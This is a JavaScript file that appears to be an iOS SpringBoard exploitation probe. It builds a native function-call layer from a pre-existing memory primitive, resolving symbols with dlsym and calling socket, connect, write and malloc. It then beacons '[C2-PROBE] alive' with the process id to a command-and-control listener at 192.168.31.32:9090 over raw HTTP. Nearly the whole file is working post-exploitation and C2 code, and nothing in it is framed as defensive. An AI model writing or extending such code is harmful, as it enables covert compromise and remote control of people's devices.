// Ultra-minimal SpringBoard eval probe
// One pelog line: [C2-PROBE] alive

const PELOG_HOST = "192.168.31.32";
const PELOG_PORT = 9090;

class Native {
	static #baseAddr; static #dlsymAddr; static #memcpyAddr; static #mallocAddr; static #oinvAddr;
	static #argMem = 0n; static #argPtr = 0n; static #dlsymCache = {};

	static init() {
		const b = new BigUint64Array(nativeCallBuff);
		this.#baseAddr = b[20]; this.#dlsymAddr = b[21]; this.#memcpyAddr = b[22];
		this.#mallocAddr = b[23]; this.#oinvAddr = b[24];
		this.#argMem = this.#nc(this.#mallocAddr, BigInt(0x1000));
		this.#argPtr = this.#argMem;
	}

	static write(ptr, buff) {
		let u = new Uint8Array(nativeCallBuff), a = new Uint8Array(buff);
		for (let i = 0; i < a.length; i += 0x1000) {
			let n = a.length - i > 0x1000 ? 0x1000 : a.length - i;
			u.set(a.subarray(i, i + n), 0x1000);
			this.#nc(this.#memcpyAddr, ptr + BigInt(i), this.#baseAddr + 0x1000n, BigInt(n));
		}
	}

	static writeString(ptr, str) {
		let b = new ArrayBuffer(str.length + 1), a = new Uint8Array(b);
		for (let i = 0; i < str.length; i++) a[i] = str.charCodeAt(i);
		this.write(ptr, b);
	}

	static callSymbol(name, x0, x1, x2, x3) {
		this.#argPtr = this.#argMem;
		if (typeof x0 === "string") { let p = this.#argPtr; this.writeString(p, x0); this.#argPtr += BigInt(x0.length + 1); x0 = p; }
		if (typeof x1 === "string") { let p = this.#argPtr; this.writeString(p, x1); this.#argPtr += BigInt(x1.length + 1); x1 = p; }
		let r = this.#nc(this.#dlsym(name), this.#arg(x0), this.#arg(x1), this.#arg(x2), this.#arg(x3));
		this.#argPtr = this.#argMem;
		return r < 0xffffffffn && r > -0xffffffffn ? Number(r) : r;
	}

	static #arg(v) { return !v ? 0n : typeof v === "bigint" ? v : BigInt(v); }

	static #dlsym(name) {
		let hit = this.#dlsymCache[name];
		if (hit) return hit;
		let b = new ArrayBuffer(name.length + 1), a = new Uint8Array(b);
		for (let i = 0; i < name.length; i++) a[i] = name.charCodeAt(i);
		new Uint8Array(nativeCallBuff).set(a, 0x1000);
		hit = this.#nc(this.#dlsymAddr, 0xfffffffffffffffen, this.#baseAddr + 0x1000n);
		if (hit) this.#dlsymCache[name] = hit;
		return hit;
	}

	static #nc(addr, x0, x1, x2, x3) {
		let b = new BigInt64Array(nativeCallBuff);
		b[0] = addr; b[100] = x0 || 0n; b[101] = x1 || 0n; b[102] = x2 || 0n; b[103] = x3 || 0n;
		invoker();
		return b[200];
	}
}

function _probeLog(msg) {
	const body = "seq=0&msg=" + encodeURIComponent(String(msg).slice(0, 500));
	const fd = Native.callSymbol("socket", 2, 1, 0);
	if (fd <= 0) return;
	const sa = Native.callSymbol("calloc", 1, 16);
	const sab = new ArrayBuffer(16), sv = new DataView(sab);
	sv.setUint8(0, 16); sv.setUint8(1, 2); sv.setUint16(2, PELOG_PORT, false);
	const p = PELOG_HOST.split(".");
	sv.setUint8(4, +p[0]); sv.setUint8(5, +p[1]); sv.setUint8(6, +p[2]); sv.setUint8(7, +p[3]);
	Native.write(sa, sab);
	if (Native.callSymbol("connect", fd, sa, 16) !== 0) { Native.callSymbol("free", sa); Native.callSymbol("close", fd); return; }
	Native.callSymbol("free", sa);
	const req = "POST /pelog HTTP/1.0\r\nHost: " + PELOG_HOST + ":" + PELOG_PORT +
		"\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " + body.length + "\r\n\r\n" + body;
	const buf = Native.callSymbol("malloc", req.length + 1);
	Native.writeString(buf, req);
	Native.callSymbol("write", fd, buf, req.length);
	Native.callSymbol("free", buf);
	Native.callSymbol("close", fd);
}

try {
	Native.init();
	invoker();
	_probeLog("[C2-PROBE] alive pid=" + Native.callSymbol("getpid"));
} catch (e) {
	try { _probeLog("[C2-PROBE] THREW " + String(e).slice(0, 120)); } catch (_) {}
}
